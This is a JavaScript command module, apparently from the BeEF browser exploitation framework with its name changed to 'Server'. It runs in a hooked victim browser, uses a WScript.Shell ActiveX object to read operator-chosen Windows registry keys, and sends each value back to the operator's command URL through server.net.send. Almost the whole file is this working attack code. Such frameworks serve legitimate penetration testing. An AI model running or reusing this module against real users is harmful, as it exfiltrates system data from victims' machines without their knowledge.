//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var internal_counter = 0;
	var timeout = 30;
	var result;
	var key_paths;

	function waituntilok() {
		try {
			var wsh = new ActiveXObject("WScript.Shell");
			if (!wsh) throw("failed to create registry object");
			else {
				for (var i=0; i<key_paths.length; i++) {
					var key_path = key_paths[i];
					if (!key_path) continue;
					try {
						var key_value = wsh.RegRead(key_path);
						result = key_path+": "+key_value;
					} catch (e) {
						result = key_path+": failed to retrieve key value";
					}
					server.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values='+result);
				}
			}
			return;
		} catch (e) {
			internal_counter++;
			if (internal_counter > timeout) {
				server.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values=Timeout after '+timeout+' seconds');
				return;
			}
			setTimeout(function() {waituntilok()},1000);
		}
	}

	try {
		key_paths = "<%= @key_paths.gsub!(/[\n|\r\n]+/, "|SERVERDELIMITER|").gsub!(/\\/, "\\\\\\") %>".split(/\|SERVERDELIMITER\|/);
		setTimeout(function() {waituntilok()},5000);
	} catch (e) {
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values=malformed registry keys were supplied');
	}

});

